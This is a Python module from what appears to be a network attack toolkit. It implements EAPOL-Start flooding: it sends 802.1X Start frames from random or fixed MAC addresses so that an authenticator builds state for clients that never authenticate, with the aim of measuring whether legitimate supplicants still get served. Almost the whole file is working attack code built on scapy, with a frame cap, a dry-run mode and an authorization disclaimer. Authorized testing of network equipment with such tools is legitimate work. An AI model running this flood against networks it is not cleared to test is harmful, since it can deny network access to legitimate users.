"""EAPOL start flooding: send EAPOL-Start frames from random MACs to an 802.1X authenticator.

A supplicant starts authentication by sending an EAPOL-Start frame to the PAE group address
(01:80:c2:00:00:03). The authenticator answers each Start with an EAP-Request/Identity to the
sender and keeps state for that MAC until the exchange ends. A flood of Start frames from many
MACs, with no answer to the identity request, makes the authenticator create that state for
each one, without authenticating any client.

This module sends the Start frames only. The effect to measure is how many of them the
authenticator answers, and whether a legitimate supplicant still gets an identity request
while the flood runs. The module does not complete any EAP exchange.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.eap import EAPOL
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac, random_mac

PAE_GROUP_MAC = "01:80:c2:00:00:03"
ETHERTYPE_EAPOL = 0x888E
EAPOL_START = 1
MAX_FRAMES = 1000


@dataclass(frozen=True)
class EapolStartFloodingConfig:
    iface: str                          # attacker interface, on the segment with the authenticator
    frames: int = 10                    # EAPOL-Start frames to send in total
    source_mac: str = ""                # fixed sender MAC; empty = a random MAC for each frame
    dry_run: bool = False               # build frames but do not send them

    def __post_init__(self) -> None:
        if self.source_mac:
            normalize_unicast_mac(self.source_mac)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class EapolStartFloodingStats:
    frames: int = 0
    status: str = ""


def build_start(source_mac: str) -> Packet:
    """An EAPOL-Start from `source_mac` to the PAE group address."""
    return Ether(src=normalize_unicast_mac(source_mac), dst=PAE_GROUP_MAC, type=ETHERTYPE_EAPOL) / EAPOL(
        version=2, type=EAPOL_START
    )


def run_eapol_start_flooding(
    config: EapolStartFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[EapolStartFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> EapolStartFloodingStats:
    """Send `frames` EAPOL-Start frames, one per step, unless `stop_event` is set first."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        origin = config.source_mac or "random MACs"
        stats = EapolStartFloodingStats(
            status=f"Dry run: would send {config.frames} EAPOL-Start frame(s) from {origin}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    stats = EapolStartFloodingStats()
    for _ in range(config.frames):
        if stop_event.is_set():
            break
        source = config.source_mac or random_mac(rng)
        send(build_start(source), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
